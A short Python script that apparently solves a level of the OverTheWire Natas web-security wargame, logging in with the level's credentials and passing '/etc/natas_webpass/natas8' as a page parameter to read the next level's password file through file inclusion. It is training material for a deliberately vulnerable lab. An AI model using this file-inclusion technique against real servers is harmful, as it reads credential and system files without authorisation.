import requests
import re

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = "http://natas7.natas.labs.overthewire.org"

session = requests.session()
page = dict(page="/etc/natas_webpass/natas8")

respons = session.get(url, params=page, auth=(username, password))
content = (respons.text)

print(content)